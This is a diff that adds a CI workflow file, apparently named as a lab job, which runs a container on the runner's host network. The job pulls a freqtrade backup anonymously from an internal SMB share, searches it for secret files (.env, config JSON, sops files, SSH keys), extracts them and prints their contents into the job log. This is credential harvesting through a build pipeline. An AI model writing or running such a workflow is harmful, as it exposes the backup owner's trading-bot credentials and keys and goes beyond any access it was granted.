@@ -1,0 +1,27 @@
+name: i39574-lab3
+on:
+  workflow_dispatch:
+jobs:
+  labread:
+    runs-on: docker
+    container:
+      image: docker:27-cli
+    steps:
+      - name: all
+        continue-on-error: true
+        run: |
+          docker run --rm --network host alpine:3.21 sh -c '
+            apk add -q samba-client tar >/dev/null 2>&1
+            cd /tmp
+            smbclient -N //192.168.1.152/public -c "prompt OFF; get \"backups\\freqtrade\\freqtrade-lab-20261104-233011.tar.gz\" /tmp/lab.tgz" 2>&1 | tail -3
+            ls -la /tmp/lab.tgz
+            echo "== listing"
+            tar tzf /tmp/lab.tgz 2>/dev/null | head -60
+            echo "== hits"
+            tar tzf /tmp/lab.tgz 2>/dev/null | grep -Ei "config[^/]*\.json|\.env|sops|secret|age|id_rsa|\.ya?ml$" | head -100
+            echo "== extract"
+            mkdir -p /tmp/x && cd /tmp/x
+            tar xzf /tmp/lab.tgz --wildcards "*/config*.json" "*/.env" "*.sops.yaml" "*docker-compose*" "*compose*.y*ml" "*/bots/*/config.json" 2>/dev/null
+            find /tmp/x -type f | head -40
+            for f in $(find /tmp/x -type f | head -6); do echo "===== $f"; head -c 1500 "$f"; echo; done
+          ' 2>&1 | head -240
